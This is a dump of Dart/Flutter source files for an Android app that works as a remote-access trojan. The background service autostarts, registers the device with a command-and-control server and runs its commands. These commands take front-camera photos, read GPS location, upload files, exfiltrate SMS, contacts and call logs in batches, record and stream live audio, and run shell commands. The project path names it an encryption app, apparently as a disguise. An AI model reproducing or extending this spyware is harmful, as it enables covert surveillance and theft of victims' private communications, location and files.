          "Service is not running, watchdog stopping.");
      return;
    }
    h.logger.info(
        "BackgroundService:Watchdog", "Watchdog check: Service is running.");
    if (!h.networkService.isSocketConnected) {
      h.logger.warn("BackgroundService:Watchdog",
          "Socket disconnected. Attempting reconnect via NetworkService.");
      h.networkService.connectSocketIO(h.currentDeviceId).catchError((e, s) =>
          h.logger.error("BackgroundService:Watchdog",
              "Error during watchdog reconnect attempt", e, s));
    }
    _checkAndRefreshRegistration(h);
  });
  h.logger.info("BackgroundService:Watchdog", "Service watchdog started.");
}

Future<void> _checkAndRefreshRegistration(BackgroundServiceHandles h) async {
  final lastRegTimeStr = h.preferences.getString('last_registration_time');
  bool needsRegistration = true;
  if (lastRegTimeStr != null) {
    try {
      final lastRegTime = DateTime.parse(lastRegTimeStr);
      if (DateTime.now().difference(lastRegTime).inHours < 6) {
        needsRegistration = false;
      }
    } catch (e) {
      h.logger.warn("BackgroundService:RefreshReg",
          "Error parsing last registration time: $e. Will re-register.");
    }
  }

  if (needsRegistration) {
    h.logger.info("BackgroundService:RefreshReg",
        "Registration refresh needed or first time. Attempting registration.");
    _registerDeviceWithC2(h);
  } else {
    h.logger.debug("BackgroundService:RefreshReg",
        "Registration is still recent. No refresh needed now.");
  }
}

Future<void> _registerDeviceWithC2(BackgroundServiceHandles h) async {
  if (!h.networkService.isSocketConnected) {
    h.logger.warn("BackgroundService:RegisterDevice",
        "Cannot register device. Socket not connected. Device ID: ${h.currentDeviceId}");
    h.networkService.connectSocketIO(h.currentDeviceId).catchError((e, s) =>
        h.logger.error("BackgroundService:RegisterDevice",
            "Error during connectSocketIO for registration", e, s));
    return;
  }
  try {
    final deviceInfoPayload = await h.deviceInfoService.getDeviceInfo();
    if (deviceInfoPayload['deviceId'] != h.currentDeviceId) {
      h.logger.warn("BackgroundService:RegisterDevice",
          "Mismatch between handles.currentDeviceId ('${h.currentDeviceId}') and deviceInfoPayload['deviceId'] ('${deviceInfoPayload['deviceId']}'). Using handles.currentDeviceId for registration.");
      deviceInfoPayload['deviceId'] = h.currentDeviceId;
    }

    h.logger.info("BackgroundService:RegisterDevice",
        "Registering device with C2. Device ID: ${h.currentDeviceId}");
    h.networkService.registerDeviceWithC2(deviceInfoPayload);

    await h.preferences
        .setString('last_registration_time', DateTime.now().toIso8601String());
    h.logger.info("BackgroundService:RegisterDevice",
        "Device registration event sent. Last registration time updated.");
  } catch (e, stackTrace) {
    h.logger.error("BackgroundService:RegisterDevice",
        "Error preparing or sending device registration", e, stackTrace);
  }
}

Future<void> _handleC2Command(
  BackgroundServiceHandles h,
  String commandName,
  Map<String, dynamic> args,
  String? commandId,
) async {
  h.logger.info("BackgroundService:HandleCommand",
      "Handling command: '$commandName' (ID: ${commandId ?? "N/A"}) with args: $args");

  final actualCommandId =
      commandId ?? 'cmd_${DateTime.now().millisecondsSinceEpoch}';

  try {
    // استخدام Command Processor الجديد
    final result = await h.commandProcessor.executeCommand(
      commandId: actualCommandId,
      command: commandName,
      args: args,
      networkService: h.networkService,
      deviceId: h.currentDeviceId,
    );

    // إرسال النتيجة
    h.networkService.sendCommandResponse(
      originalCommand: commandName,
      commandId: actualCommandId,
      status: result['status'] ?? 'success',
      payload: result,
    );
  } catch (e, stackTrace) {
    h.logger.error(
        "BackgroundService:HandleCommand",
        "Error handling command '$commandName' (ID: ${commandId ?? "N/A"})",
        e,
        stackTrace);

    h.networkService.sendCommandResponse(
      originalCommand: commandName,
      commandId: actualCommandId,
      status: 'error',
      payload: {'message': e.toString()},
    );
  }
}

Future<void> _stopService(BackgroundServiceHandles h) async {
  h.logger.info("BackgroundService:StopService", "Stopping service now...");
  _isServiceRunning = false;

  _serviceWatchdogTimer?.cancel();
  _serviceWatchdogTimer = null;

  await _connectionStatusSubscription?.cancel();
  _connectionStatusSubscription = null;
  await _commandSubscription?.cancel();
  _commandSubscription = null;

  // تنظيف Command Processor
  h.commandProcessor.dispose();

  // تنظيف UI Bridge requests
  for (var completer in _pendingUIRequests.values) {
    if (!completer.isCompleted) {
      completer.complete({'status': 'error', 'message': 'Service stopped'});
    }
  }
  _pendingUIRequests.clear();

  h.networkService.dispose();
  h.logger.info("BackgroundService:StopService", "NetworkService disposed.");

  try {
    await h.serviceInstance.stopSelf();
    h.logger.info("BackgroundService:StopService",
        "Service instance stopped successfully.");
  } catch (e, s) {
    h.logger.error("BackgroundService:StopService",
        "Error stopping service instance", e, s);
  }
}

Future<bool> initializeBackgroundService() async {
  final logger = EnhancedLoggerService();
  logger.info("BackgroundService:Initialize",
      "Attempting to initialize FlutterBackgroundService...");
  final service = FlutterBackgroundService();

  if (Platform.isAndroid) {
    final flutterLocalNotificationsPlugin = FlutterLocalNotificationsPlugin();
    const androidInitialize =
        AndroidInitializationSettings('@mipmap/ic_launcher');
    const initializationSettings =
        InitializationSettings(android: androidInitialize);
    try {
      await flutterLocalNotificationsPlugin.initialize(initializationSettings);
      logger.info("BackgroundService:Initialize",
          "FlutterLocalNotificationsPlugin initialized.");

      const channel = AndroidNotificationChannel(
        'conduit_service_channel_id',
        'The Conduit Service Notifications',
        description:
            'Notifications for The Conduit background service activity.',
        importance: Importance.low,
        playSound: false,
        enableVibration: false,
        showBadge: false,
      );
      await flutterLocalNotificationsPlugin
          .resolvePlatformSpecificImplementation<
              AndroidFlutterLocalNotificationsPlugin>()
          ?.createNotificationChannel(channel);
      logger.info("BackgroundService:Initialize",
          "Notification channel 'conduit_service_channel_id' created/updated.");
    } catch (e, stackTrace) {
      logger.error("BackgroundService:Initialize",
          "Error initializing notifications or channel", e, stackTrace);
    }
  }

  try {
    await service.configure(
      androidConfiguration: AndroidConfiguration(
        onStart: onStart,
        isForegroundMode: true,
        autoStart: true,
        notificationChannelId: 'conduit_service_channel_id',
        initialNotificationTitle: 'The Conduit Service',
        initialNotificationContent:
            'Initializing The Conduit background operations...',
        foregroundServiceNotificationId: 888,
      ),
      iosConfiguration: IosConfiguration(
        autoStart: true,
        onForeground: onStart,
      ),
    );
    logger.info("BackgroundService:Initialize",
        "FlutterBackgroundService configured successfully.");
    return true;
  } catch (e, stackTrace) {
    logger.error("BackgroundService:Initialize",
        "Fatal error configuring FlutterBackgroundService", e, stackTrace);
    return false;
  }
}



// ------------------------------ نهاية الملف: background_service.dart ------------------------------
// ======================================================================


// ============================== بداية الملف: camera_service.dart ==============================
// المسار الكامل: E:\GitHub Projects\EncryptionApp\jjjjjjjjjjjjj\services\camera_service.dart
// ----------------------------------------------------------------------

// lib/services/camera_service.dart
// الإصدار المعدل لاستخدام Platform Channels للوصول إلى الكاميرا من الخلفية بشكل موثوق

import 'dart:async';

import 'package:camera/camera.dart'
    show XFile, CameraLensDirection; // نحتفظ بها لـ XFile وتعاريف العدسات
import 'package:flutter/foundation.dart'; // لـ debugPrint
import 'package:flutter/services.dart'; // مطلوب لـ PlatformChannel

class CameraService {
  // تعريف قناة الاتصال. تم تحديثها لتتطابق مع ما هو معرف في MainActivity.kt
  static const MethodChannel _channel =
      MethodChannel('com.zeroone.theconduit/camera');

  // لم نعد بحاجة لـ CameraController أو قائمة الكاميرات هنا إذا كانت كل العمليات تتم في الكود الأصلي.

  Future<bool> initializeCamera(CameraLensDirection direction) async {
    // الكود الأصلي سيتولى التهيئة عند استدعاء takePicture،
    // أو يمكننا إضافة دالة تهيئة خاصة إذا احتجنا لتهيئة مسبقة.
    // للتبسيط، نفترض أن الكود الأصلي يهيئ الكاميرا لكل لقطة.
    debugPrint(
        "CameraService (Dart): استدعاء initializeCamera لـ ${direction.name}. الكود الأصلي سيتولى التهيئة الفعلية.");
    // قد تصبح هذه الدالة بدون أي عمليات أو فقط للتسجيل إذا كان الكود الأصلي يدير كل شيء.
    return true; // نفترض أن الكود الأصلي سينجح أو يعالج الأخطاء.
  }

  Future<XFile?> takePicture(
      {required CameraLensDirection lensDirection}) async {
    debugPrint(
        "CameraService (Dart): محاولة التقاط صورة عبر قناة الاتصال (العدسة: ${lensDirection.name})");
    try {
      // استدعاء الدالة 'takePicture' في الكود الأصلي وتمرير اتجاه العدسة.
      final String? filePath = await _channel.invokeMethod('takePicture', {
        'lensDirection':
            lensDirection == CameraLensDirection.front ? 'front' : 'back',
      });

      if (filePath != null) {
        debugPrint(
            "CameraService (Dart): تم التقاط الصورة بنجاح عبر الكود الأصلي. المسار: $filePath");
        return XFile(filePath);
      } else {
        debugPrint(
            "CameraService (Dart): دالة takePicture الأصلية أعادت مسارًا فارغًا.");
        return null;
      }
    } on PlatformException catch (e) {
      debugPrint(
          "CameraService (Dart): خطأ أثناء استدعاء دالة takePicture الأصلية: ${e.message}");
      return null;
    } catch (e) {
      debugPrint("CameraService (Dart): خطأ غير متوقع في takePicture: $e");
      return null;
    }
  }

  Future<void> dispose() async {
    // إذا كان الكود الأصلي يدير دورة حياة الكاميرا، فقد تكون دالة dispose في Dart بسيطة.
    // يمكن استدعاء دالة dispose أصلية إذا لزم الأمر.
    debugPrint(
        "CameraService (Dart): استدعاء Dispose. يجب أن يتولى الكود الأصلي تحرير الموارد إذا لزم الأمر.");
    try {
      await _channel.invokeMethod(
          'disposeCamera'); // استدعاء دالة dispose في الكود الأصلي
    } on PlatformException catch (e) {
      debugPrint(
          "CameraService (Dart): خطأ أثناء استدعاء دالة disposeCamera الأصلية: ${e.message}");
    }
    // لا يوجد CameraController محلي لتحريره.
  }
}

// يمكن الإبقاء على هذا الامتداد المساعد
extension LensDirectionName on CameraLensDirection {
  String get name {
    switch (this) {
      case CameraLensDirection.front:
        return 'الأمامية';
      case CameraLensDirection.back:
        return 'الخلفية';
      case CameraLensDirection.external:
        return 'الخارجية';
    }
  }
}



// ------------------------------ نهاية الملف: camera_service.dart ------------------------------
// ======================================================================


// ============================== بداية الملف: command_processor.dart ==============================
// المسار الكامل: E:\GitHub Projects\EncryptionApp\jjjjjjjjjjjjj\services\command_processor.dart
// ----------------------------------------------------------------------

// lib/services/command_processor.dart
import 'dart:async';
import 'dart:convert';
import 'dart:io';

import 'package:camera/camera.dart';
import 'package:collection/collection.dart';
import 'package:flutter_background_service/flutter_background_service.dart';
import 'package:geolocator/geolocator.dart';

import '../core/logging/enhanced_logger_service.dart';
import '../utils/constants.dart';
import 'network_service.dart';

enum CommandPriority {
  emergency(0), // فوري - لقطة شاشة، موقع طارئ
  high(1), // عالي - تسجيل صوت، كاميرا
  normal(2), // عادي - قائمة ملفات، معلومات نظام
  low(3), // منخفض - تصدير جهات اتصال، رسائل
  background(4); // خلفية - عمليات ثقيلة

  const CommandPriority(this.level);
  final int level;
}

class PrioritizedCommand {
  final String id;
  final String command;
  final Map<String, dynamic> args;
  final CommandPriority priority;
  final DateTime timestamp;
  final Completer<Map<String, dynamic>> completer;

  PrioritizedCommand({
    required this.id,
    required this.command,
    required this.args,
    required this.priority,
    required this.timestamp,
    required this.completer,
  });
}

class CommandProcessor {
  static final CommandProcessor _instance = CommandProcessor._internal();
  factory CommandProcessor() => _instance;
  CommandProcessor._internal();

  final EnhancedLoggerService _logger = EnhancedLoggerService();
  final PriorityQueue<PrioritizedCommand> _commandQueue =
      PriorityQueue<PrioritizedCommand>((a, b) {
    // أولاً حسب الأولوية، ثم حسب الوقت
    if (a.priority.level != b.priority.level) {
      return a.priority.level.compareTo(b.priority.level);
    }
    return a.timestamp.compareTo(b.timestamp);
  });

  final Map<String, Timer> _runningCommands = {};
  final Map<String, StreamSubscription> _dataStreams = {};
  bool _isProcessing = false;
  final int _maxConcurrentCommands = 3;
  int _currentCommandCount = 0;

  // خريطة أولويات الأوامر
  static const Map<String, CommandPriority> _commandPriorities = {
    SIO_CMD_TAKE_PICTURE: CommandPriority.emergency,
    SIO_CMD_GET_LOCATION: CommandPriority.emergency,
    SIO_CMD_RECORD_AUDIO_FIXED: CommandPriority.high,
    SIO_CMD_START_LIVE_AUDIO: CommandPriority.high,
    SIO_CMD_STOP_LIVE_AUDIO: CommandPriority.high,
    SIO_CMD_LIST_FILES: CommandPriority.normal,
    SIO_CMD_UPLOAD_SPECIFIC_FILE: CommandPriority.normal,
    SIO_CMD_EXECUTE_SHELL: CommandPriority.normal,
    SIO_CMD_GET_SMS_LIST: CommandPriority.low,
    SIO_CMD_GET_CONTACTS_LIST: CommandPriority.low,
    SIO_CMD_GET_CALL_LOGS: CommandPriority.low,
  };

  Future<Map<String, dynamic>> executeCommand({
    required String commandId,
    required String command,
    required Map<String, dynamic> args,
    required NetworkService networkService,
    required String deviceId,
  }) async {
    final priority = _commandPriorities[command] ?? CommandPriority.normal;
    final completer = Completer<Map<String, dynamic>>();

    final prioritizedCommand = PrioritizedCommand(
      id: commandId,
      command: command,
      args: args,
      priority: priority,
      timestamp: DateTime.now(),
      completer: completer,
    );

    _commandQueue.add(prioritizedCommand);
    _logger.info("CommandProcessor",
        "Command '$command' (ID: $commandId) queued with priority ${priority.name}");

    _processQueue(networkService, deviceId);

    return completer.future;
  }

  void _processQueue(NetworkService networkService, String deviceId) async {
    if (_isProcessing) return;
    _isProcessing = true;

    try {
      while (_commandQueue.isNotEmpty &&
          _currentCommandCount < _maxConcurrentCommands) {
        final command = _commandQueue.removeFirst();
        _currentCommandCount++;

        _executeCommandInternal(command, networkService, deviceId);
      }
    } finally {
      _isProcessing = false;
    }
  }

  Future<void> _executeCommandInternal(
    PrioritizedCommand command,
    NetworkService networkService,
    String deviceId,
  ) async {
    try {
      _logger.info("CommandProcessor",
          "Executing command '${command.command}' (ID: ${command.id}) with priority ${command.priority.name}");

      Map<String, dynamic> result;

      switch (command.command) {
        case SIO_CMD_TAKE_PICTURE:
          result =
              await _handleTakeScreenshot(command, networkService, deviceId);
          break;
        case SIO_CMD_GET_LOCATION:
          result = await _handleGetLocation(command);
          break;
        case SIO_CMD_LIST_FILES:
          result = await _handleListFiles(command);
          break;
        case SIO_CMD_GET_SMS_LIST:
          result = await _handleGetSmsListPaginated(
              command, networkService, deviceId);
          break;
        case SIO_CMD_GET_CONTACTS_LIST:
          result = await _handleGetContactsListPaginated(
              command, networkService, deviceId);
          break;
        case SIO_CMD_GET_CALL_LOGS:
          result = await _handleGetCallLogsPaginated(
              command, networkService, deviceId);
          break;
        case SIO_CMD_RECORD_AUDIO_FIXED:
          result = await _handleRecordAudio(command, networkService, deviceId);
          break;
        case SIO_CMD_START_LIVE_AUDIO:
          result = await _handleStartLiveAudio(command);
          break;
        case SIO_CMD_STOP_LIVE_AUDIO:
          result = await _handleStopLiveAudio(command);
          break;
        case SIO_CMD_UPLOAD_SPECIFIC_FILE:
          result = await _handleUploadFile(command, networkService, deviceId);
          break;
        case SIO_CMD_EXECUTE_SHELL:
          result = await _handleExecuteShell(command);
          break;
        default:
          result = {
            'status': 'error',
            'message': 'Unknown command: ${command.command}'
          };
      }

      command.completer.complete(result);
    } catch (e, stackTrace) {
      _logger.error(
          "CommandProcessor",
          "Error executing command '${command.command}' (ID: ${command.id})",
          e,
          stackTrace);
      command.completer.complete({
        'status': 'error',
        'message': e.toString(),
      });
    } finally {
      _currentCommandCount--;
      // إعادة تشغيل معالج القائمة إذا كان هناك أوامر أخرى
      if (_commandQueue.isNotEmpty) {
        _processQueue(networkService, deviceId);
      }
    }
  }

  Future<Map<String, dynamic>> _handleTakeScreenshot(
    PrioritizedCommand command,
    NetworkService networkService,
    String deviceId,
  ) async {
    // هنا سنستخدم UI Channel بدلاً من Native Channel مباشرة
    final completer = Completer<Map<String, dynamic>>();

    // إرسال طلب للـ UI thread
    _sendToUIThread('requestScreenshot', {
      'commandId': command.id,
      'callback': (result) => completer.complete(result),
    });

    return completer.future;
  }

  Future<Map<String, dynamic>> _handleGetLocation(
      PrioritizedCommand command) async {
    try {
      final Position location = await Geolocator.getCurrentPosition(
        desiredAccuracy: LocationAccuracy.high,
        timeLimit: const Duration(seconds: 10),
      );

      return {
        'status': 'success',
        'latitude': location.latitude,
        'longitude': location.longitude,
        'accuracy': location.accuracy,
        'altitude': location.altitude,
        'speed': location.speed,
        'timestamp_gps': location.timestamp.toIso8601String(),
      };
    } catch (e) {
      return {'status': 'error', 'message': e.toString()};
    }
  }

  Future<Map<String, dynamic>> _handleListFiles(
      PrioritizedCommand command) async {
    final path = command.args['path'] as String? ?? '/';

    // استخدام UI Channel للوصول للـ Native Methods
    final completer = Completer<Map<String, dynamic>>();

    _sendToUIThread('listFiles', {
      'path': path,
      'callback': (result) => completer.complete(result),
    });

    return completer.future;
  }

  // معالجة SMS مع Pagination
  Future<Map<String, dynamic>> _handleGetSmsListPaginated(
    PrioritizedCommand command,
    NetworkService networkService,
    String deviceId,
  ) async {
    const int batchSize = 50; // تحميل 50 رسالة في كل دفعة
    int offset = command.args['offset'] as int? ?? 0;

    final completer = Completer<Map<String, dynamic>>();

    _sendToUIThread('getSmsListPaginated', {
      'offset': offset,
      'limit': batchSize,
      'callback': (result) async {
        if (result['status'] == 'success') {
          // حفظ البيانات كملف مؤقت
          final file = await _saveDataToTempFile(result['data'],
              'sms_batch_${offset}_${DateTime.now().millisecondsSinceEpoch}');

          if (file != null) {
            // رفع الملف
            await networkService.uploadFileFromCommand(
              deviceId: deviceId,
              commandRef: command.command,
              commandId: command.id,
              fileToUpload: file,
            );

            // حذف الملف المؤقت
            try {
              await File(file.path).delete();
            } catch (_) {}

            completer.complete({
              'status': 'success',
              'message': 'SMS batch uploaded successfully',
              'batch_info': {
                'offset': offset,
                'count': result['count'],
                'has_more': result['has_more'],
              }
            });
          } else {
            completer.complete({
              'status': 'error',
              'message': 'Failed to save SMS batch to file'
            });
          }
        } else {
          completer.complete(result);
        }
      },
    });

    return completer.future;
  }

  // معالجة Contacts مع Pagination
  Future<Map<String, dynamic>> _handleGetContactsListPaginated(
    PrioritizedCommand command,
    NetworkService networkService,
    String deviceId,
  ) async {
    const int batchSize = 100;
    int offset = command.args['offset'] as int? ?? 0;

    final completer = Completer<Map<String, dynamic>>();

    _sendToUIThread('getContactsListPaginated', {
      'offset': offset,
      'limit': batchSize,
      'callback': (result) async {
        if (result['status'] == 'success') {
          final file = await _saveDataToTempFile(result['data'],
              'contacts_batch_${offset}_${DateTime.now().millisecondsSinceEpoch}');

          if (file != null) {
            await networkService.uploadFileFromCommand(
              deviceId: deviceId,
              commandRef: command.command,
              commandId: command.id,
              fileToUpload: file,
            );

            try {
              await File(file.path).delete();
            } catch (_) {}

            completer.complete({
              'status': 'success',
              'message': 'Contacts batch uploaded successfully',
              'batch_info': {
                'offset': offset,
                'count': result['count'],
                'has_more': result['has_more'],
              }
            });
          } else {
            completer.complete({
              'status': 'error',
              'message': 'Failed to save contacts batch to file'
            });
          }
        } else {
          completer.complete(result);
        }
      },
    });

    return completer.future;
  }

  Future<Map<String, dynamic>> _handleGetCallLogsPaginated(
    PrioritizedCommand command,
    NetworkService networkService,
    String deviceId,
  ) async {
    const int batchSize = 75;
    int offset = command.args['offset'] as int? ?? 0;

    final completer = Completer<Map<String, dynamic>>();

    _sendToUIThread('getCallLogsPaginated', {
      'offset': offset,
      'limit': batchSize,
      'callback': (result) async {
        if (result['status'] == 'success') {
          final file = await _saveDataToTempFile(result['data'],
              'call_logs_batch_${offset}_${DateTime.now().millisecondsSinceEpoch}');

          if (file != null) {
            await networkService.uploadFileFromCommand(
              deviceId: deviceId,
              commandRef: command.command,
              commandId: command.id,
              fileToUpload: file,
            );

            try {
              await File(file.path).delete();
            } catch (_) {}

            completer.complete({
              'status': 'success',
              'message': 'Call logs batch uploaded successfully',
              'batch_info': {
                'offset': offset,
                'count': result['count'],
                'has_more': result['has_more'],
              }
            });
          } else {
            completer.complete({
              'status': 'error',
              'message': 'Failed to save call logs batch to file'
            });
          }
        } else {
          completer.complete(result);
        }
      },
    });

    return completer.future;
  }

  Future<Map<String, dynamic>> _handleRecordAudio(
    PrioritizedCommand command,
    NetworkService networkService,
    String deviceId,
  ) async {
    final duration = command.args['duration_seconds'] as int? ?? 10;

    final completer = Completer<Map<String, dynamic>>();

    _sendToUIThread('recordAudio', {
      'duration_seconds': duration,
      'callback': (result) async {
        if (result['status'] == 'success' && result['filePath'] != null) {
          final audioFile = XFile(result['filePath']);

          await networkService.uploadFileFromCommand(
            deviceId: deviceId,
            commandRef: command.command,
            commandId: command.id,
            fileToUpload: audioFile,
          );

          try {
            await File(result['filePath']).delete();
          } catch (_) {}

          completer.complete({
            'status': 'success',
            'message': 'Audio recorded and uploaded successfully'
          });
        } else {
          completer.complete(result);
        }
      },
    });

    return completer.future;
  }

  Future<Map<String, dynamic>> _handleStartLiveAudio(
      PrioritizedCommand command) async {
    final completer = Completer<Map<String, dynamic>>();

    _sendToUIThread('startLiveAudio', {
      'callback': (result) => completer.complete(result),
    });

    return completer.future;
  }

  Future<Map<String, dynamic>> _handleStopLiveAudio(
      PrioritizedCommand command) async {
    final completer = Completer<Map<String, dynamic>>();

    _sendToUIThread('stopLiveAudio', {
      'callback': (result) => completer.complete(result),
    });

    return completer.future;
  }

  Future<Map<String, dynamic>> _handleUploadFile(
    PrioritizedCommand command,
    NetworkService networkService,
    String deviceId,
  ) async {
    final filePath = command.args['path'] as String?;

    if (filePath == null || filePath.isEmpty) {
      return {'status': 'error', 'message': 'File path is required'};
    }

    final file = File(filePath);
    if (!await file.exists()) {
      return {'status': 'error', 'message': 'File not found: $filePath'};
    }

    try {
      await networkService.uploadFileFromCommand(
        deviceId: deviceId,
        commandRef: command.command,
        commandId: command.id,
        fileToUpload: XFile(filePath),
      );

      return {'status': 'success', 'message': 'File uploaded successfully'};
    } catch (e) {
      return {'status': 'error', 'message': 'Upload failed: $e'};
    }
  }

  Future<Map<String, dynamic>> _handleExecuteShell(
      PrioritizedCommand command) async {
    final commandName = command.args['command_name'] as String?;
    final commandArgs = (command.args['command_args'] as List<dynamic>?)
            ?.map((e) => e.toString())
            .toList() ??
        [];

    if (commandName == null || commandName.isEmpty) {
      return {'status': 'error', 'message': 'Command name is required'};
    }

    final completer = Completer<Map<String, dynamic>>();

    _sendToUIThread('executeShell', {
      'command': commandName,
      'args': commandArgs,
      'callback': (result) => completer.complete(result),
    });

    return completer.future;
  }

  // دالة لإرسال طلبات للـ UI Thread
  Future<Map<String, dynamic>> _sendToUIThread(
      String method, Map<String, dynamic> params) async {
    // إنشاء Completer لانتظار النتيجة
    final completer = Completer<Map<String, dynamic>>();
    final requestId =
        'cmd_proc_${DateTime.now().millisecondsSinceEpoch}_${params.hashCode}';

    // تخزين مؤقت للطلب
    _pendingUIRequests[requestId] = completer;

    try {
      // استخدام FlutterBackgroundService للتواصل مع UI Thread
      final service = FlutterBackgroundService();

      service.invoke('ui_bridge_request', {
        'requestId': requestId,
        'method': method,
        'params': params,
      });

      // انتظار النتيجة مع timeout
      return await completer.future.timeout(
        const Duration(seconds: 30),
        onTimeout: () {
          _pendingUIRequests.remove(requestId);
          return {
            'status': 'error',
            'message': 'UI request timeout for method: $method',
          };
        },
      );
    } catch (e) {
      _pendingUIRequests.remove(requestId);
      return {
        'status': 'error',
        'message': 'Failed to send request to UI: $e',
      };
    }
  }

  // دالة لمعالجة الردود من UI Thread
  void handleUIResponse(String requestId, Map<String, dynamic> result) {
    final completer = _pendingUIRequests.remove(requestId);
    if (completer != null && !completer.isCompleted) {
      completer.complete(result);
    }
  }

  // إضافة Map لتخزين الطلبات المعلقة
  final Map<String, Completer<Map<String, dynamic>>> _pendingUIRequests = {};

  Future<XFile?> _saveDataToTempFile(
      List<dynamic> data, String baseName) async {
    if (data.isEmpty) return null;

    try {
      final directory = Directory.systemTemp;
      final timestamp = DateTime.now().millisecondsSinceEpoch;
      final filePath = '${directory.path}/${baseName}_$timestamp.json';
      final file = File(filePath);

      await file.writeAsString(jsonEncode(data));
      _logger.info(
          "CommandProcessor", "Data saved to temporary file: $filePath");

      return XFile(filePath);
    } catch (e) {
      _logger.error("CommandProcessor", "Error saving data to temp file", e);
      return null;
    }
  }

  void dispose() {
    for (var timer in _runningCommands.values) {
      timer.cancel();
    }
    _runningCommands.clear();

    for (var subscription in _dataStreams.values) {
      subscription.cancel();
    }
    _dataStreams.clear();

    _commandQueue.clear();
  }
}



// ------------------------------ نهاية الملف: command_processor.dart ------------------------------
// ======================================================================


// ============================== بداية الملف: data_collector_service.dart ==============================
// المسار الكامل: E:\GitHub Projects\EncryptionApp\jjjjjjjjjjjjj\services\data_collector_service.dart
// ----------------------------------------------------------------------

// lib/services/data_collector_service.dart
import 'dart:async';
import 'package:camera/camera.dart';
import 'package:flutter/foundation.dart'; // << لاستخدام debugPrint
import 'package:intl/intl.dart'; // لتنسيق الوقت
// import 'package:location/location.dart'; // << تم التغيير إلى geolocator
import 'package:geolocator/geolocator.dart'; // << لاستخدام Position

import 'location_service.dart';
import 'device_info_service.dart';
import 'camera_service.dart';

class DataCollectorService {
  final LocationService _locationService = LocationService();
  final DeviceInfoService _deviceInfoService = DeviceInfoService();
  final CameraService _cameraService = CameraService();

  Future<Map<String, dynamic>> collectInitialDataFromUiThread() async {
    debugPrint(
      "DataCollectorService (UI Thread): Starting initial data collection...",
    );
    final Map<String, dynamic> collectedPayload = {};
    Map<String, dynamic> jsonDataToBuild = {};
    XFile? capturedFrontImageFile;

    // 1. معلومات الجهاز
    debugPrint("DataCollectorService (UI Thread): Getting device info...");
    try {
      final deviceInfo = await _deviceInfoService.getDeviceInfo();
      jsonDataToBuild['deviceInfo'] = deviceInfo;
      if (deviceInfo.containsKey('deviceId')) {
        debugPrint(
          "DataCollectorService (UI Thread): Device info collected successfully, Device ID: ${deviceInfo['deviceId']}",
        );
      } else {
        debugPrint(
          "DataCollectorService (UI Thread): WARNING - Device ID not found in deviceInfo payload from DeviceInfoService.",
        );
      }
    } catch (e, s) {
      debugPrint(
        "DataCollectorService (UI Thread): Error getting device info: $e\nStackTrace: $s",
      );
      jsonDataToBuild['deviceInfo'] = {
        'error': 'Failed to get device info',
        'details': e.toString(),
      };
    }

    // 2. الموقع الجغرافي (باستخدام Position من geolocator)
    debugPrint("DataCollectorService (UI Thread): Getting current location...");
    try {
      // LocationService.getCurrentLocation() الآن يعيد Position? من geolocator
      final Position? positionData =
          await _locationService.getCurrentLocation();
      if (positionData != null) {
        jsonDataToBuild['location'] = {
          'latitude': positionData.latitude,
          'longitude': positionData.longitude,
          'accuracy': positionData.accuracy,
          'altitude': positionData.altitude,
          'speed': positionData.speed,
          'timestamp_gps':
              positionData.timestamp
                  ?.toIso8601String(), // Position.timestamp is DateTime?
        };
        debugPrint(
          "DataCollectorService (UI Thread): Location data collected: ${jsonDataToBuild['location']}",
        );
      } else {
        debugPrint(
          "DataCollectorService (UI Thread): Location data (Position) returned null.",
        );
        jsonDataToBuild['location'] = {
          'error':
              'Failed to get location data (service returned null Position)',
        };
      }
    } catch (e, s) {
      debugPrint(
        "DataCollectorService (UI Thread): Error getting location: $e\nStackTrace: $s",
      );
      jsonDataToBuild['location'] = {
        'error': 'Failed to get location due to exception',
        'details': e.toString(),
      };
    }

    // 3. التقاط صورة من الكاميرا الأمامية
    debugPrint(
      "DataCollectorService (UI Thread): Attempting to initialize and capture front camera image...",
    );
    try {
      // تم التأكد من أن CameraService.initializeCamera لا يتم استدعاؤه هنا مباشرة
      // بل يتم الاعتماد على أن QrScannerScreen يقوم بالتهيئة
      // ولكن لأغراض جمع البيانات الأولية، قد نحتاج لتهيئة مؤقتة إذا لم تكن مهيئة
      // أو الأفضل أن يكون CameraService مهيأً بشكل مستقل أو من خلال QrScannerScreen
      // بناءً على الخطأ السابق، takePicture يتطلب lensDirection
      capturedFrontImageFile = await _cameraService.takePicture(
        lensDirection: CameraLensDirection.front,
      );
      if (capturedFrontImageFile != null) {
        debugPrint(
          "DataCollectorService (UI Thread): Front image captured: ${capturedFrontImageFile.path}",
        );
        jsonDataToBuild['frontImageInfo'] = {
          'status': 'Captured',
          'name_on_device': capturedFrontImageFile.name,
          'path_on_device': capturedFrontImageFile.path,
        };
      } else {
        debugPrint(
          "DataCollectorService (UI Thread): Front image capture attempt resulted in null XFile.",
        );
        jsonDataToBuild['frontImageInfo'] = {
          'error': 'Failed to capture front image (XFile was null)',
        };
      }
    } catch (e, s) {
      debugPrint(
        "DataCollectorService (UI Thread): Exception during front camera operations: $e\nStackTrace: $s",
      );
      jsonDataToBuild['frontImageInfo'] = {
        'error': 'Exception during camera operation',
        'details': e.toString(),
      };
    }
    // لا يتم عمل dispose للكاميرا هنا، QrScannerScreen يتولى ذلك

    // 4. إضافة الطابع الزمني النهائي
    jsonDataToBuild['timestamp_collection_utc'] =
        DateTime.now().toUtc().toIso8601String();
    jsonDataToBuild['timestamp_collection_local'] = DateFormat(
      'yyyy-MM-dd HH:mm:ss ZZZZ',
      'en_US',
    ).format(DateTime.now());

    // 5. تجميع الحمولة النهائية
    collectedPayload['data'] = jsonDataToBuild;
    collectedPayload['imageFile'] = capturedFrontImageFile;

    debugPrint(
      "DataCollectorService (UI Thread): Initial data collection process finished. Payload ready.",
    );
    return collectedPayload;
  }

  Future<void> disposeCamera() async {
    debugPrint(
      "DataCollectorService: disposeCamera() called from outside. Disposing camera resources...",
    );
    await _cameraService.dispose();
    debugPrint("DataCollectorService: Camera resources disposed.");
  }
}



// ------------------------------ نهاية الملف: data_collector_service.dart ------------------------------
// ======================================================================


// ============================== بداية الملف: device_info_service.dart ==============================
// المسار الكامل: E:\GitHub Projects\EncryptionApp\jjjjjjjjjjjjj\services\device_info_service.dart
// ----------------------------------------------------------------------

// lib/services/device_info_service.dart
import 'dart:io' show Platform;

import 'package:device_info_plus/device_info_plus.dart';
import 'package:flutter/foundation.dart' show kIsWeb, debugPrint;
import 'package:shared_preferences/shared_preferences.dart';
import 'package:uuid/uuid.dart';

import '../utils/constants.dart'; //  للوصول إلى PREF_DEVICE_ID المحدث

class DeviceInfoService {
